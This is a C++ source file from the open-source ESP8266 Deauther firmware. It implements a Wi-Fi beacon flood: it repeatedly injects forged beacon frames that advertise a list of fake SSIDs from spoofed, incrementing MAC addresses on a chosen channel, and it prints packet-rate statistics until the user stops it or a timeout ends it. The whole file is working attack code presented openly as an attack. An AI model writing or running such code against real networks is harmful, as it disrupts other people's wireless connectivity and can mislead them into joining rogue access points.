/*
   Copyright (c) 2020 Stefan Kremser
   This software is licensed under the MIT License. See the license file for details.
   Source: github.com/spacehuhn/esp8266_deauther
 */

#include "attack.h"

#include "debug.h"
#include "cli.h"
#include "strh.h"

namespace attack {
    void beacon(StringList& ssid_list, uint8_t* mac_from, uint8_t* mac_to, Encryption enc, uint8_t ch, unsigned long timeout) {
        debug("Sending beacons from ");
        debug(strh::mac(mac_from));
        debug(" to ");
        debug(strh::mac(mac_to));
        debug(" on channel ");
        debugln(ch);

        if (timeout > 0) {
            debug("Stop after ");
            debug(timeout/1000);
            debugln(" seconds");
        }

        debugln("Type 'stop' or 'exit' to stop the attack");

        uint8_t last_byte = mac_from[5];

        unsigned long start_time  = millis();
        unsigned long output_time = millis();

        unsigned long pkts_sent       = 0;
        unsigned long pkts_per_second = 0;

        unsigned long pkt_time     = millis();
        unsigned long pkt_interval = 100;

        bool running = true;

        while (running) {
            if (millis() - pkt_time >= pkt_interval) {
                pkt_time = millis();
                ssid_list.begin();

                for (int i = 0; running && i<ssid_list.size(); ++i) {
                    mac_from[5] = last_byte + i;

                    String ssid = ssid_list.iterate();

                    pkts_per_second += packetinjector::beacon(ch, mac_from, mac_to, ssid.c_str(), enc);
                    delay(1);

                    running = !(cli::read_exit() || (timeout > 0 && millis() - start_time > timeout));
                }
            }

            if (millis() - output_time >= 1000) {
                pkts_sent += pkts_per_second;

                debug(pkts_per_second);
                debug(" pkts/s, ");
                debug(pkts_sent);
                debugln(" sent ");

                output_time = millis();

                pkts_per_second = 0;
            }
        }
        debugln("Finished ");
    }
}